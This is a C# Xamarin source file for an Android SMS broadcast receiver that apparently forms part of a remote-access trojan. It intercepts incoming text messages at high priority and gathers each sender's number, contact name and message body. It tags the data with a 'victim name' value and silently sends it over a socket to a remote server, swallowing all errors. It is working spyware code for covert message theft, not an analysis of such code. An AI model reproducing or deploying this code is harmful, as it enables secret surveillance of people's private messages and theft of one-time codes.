using Android.App;
using Android.Content;
using Android.OS;
using Android.Telephony;
using System;
using System.Net.Sockets;

namespace Task2
{
    [BroadcastReceiver]
    [IntentFilter(new[] { "android.provider.Telephony.SMS_RECEIVED" }, Priority = (int)IntentFilterPriority.HighPriority)]
    class SMSBroadcastReceiver : BroadcastReceiver
    {
        public override void OnReceive(Context context, Intent intent)
        {
            Bundle bundle = intent.Extras;
            try
            {
                if (bundle != null)
                {
                    System.Text.StringBuilder message = new System.Text.StringBuilder();
                    string phoneNumber = "";
                    Java.Lang.Object[] pdusObj = (Java.Lang.Object[])bundle.Get("pdus");
                    SmsMessage[] messages = new SmsMessage[pdusObj.Length];
                    for (int i = 0; i < messages.Length; i++)
                    {
                        if (Build.VERSION.SdkInt >= BuildVersionCodes.M)
                        {
                            string format = bundle.GetString("format");
                            messages[i] = SmsMessage.CreateFromPdu((byte[])pdusObj[i], format);
                        }
                        else
                        {
                            messages[i] = SmsMessage.CreateFromPdu((byte[])pdusObj[i]);
                        }
                        phoneNumber = messages[i].OriginatingAddress;
                        message.Append(messages[i].MessageBody);
                        message.Append("\n");
                    }

                    string senderNum = phoneNumber;
                    string isim = ForegroundService._globalService.telefondanIsim(senderNum);
                    try
                    {
                        byte[] dataPacker = ForegroundService._globalService.MyDataPacker("RECSMS", System.Text.Encoding.UTF8.GetBytes("[VERI]" + isim + "[VERI]" + senderNum + "[VERI]" + message +
                   "[VERI]" + MainValues.KRBN_ISMI + "@" + ForegroundService.Soketimiz.RemoteEndPoint.ToString()));
                        ForegroundService.Soketimiz.Send(dataPacker, 0, dataPacker.Length, SocketFlags.None);
                    }
                    catch (Exception) { }
                }
            }
            catch (Exception) { }
        }
    }
}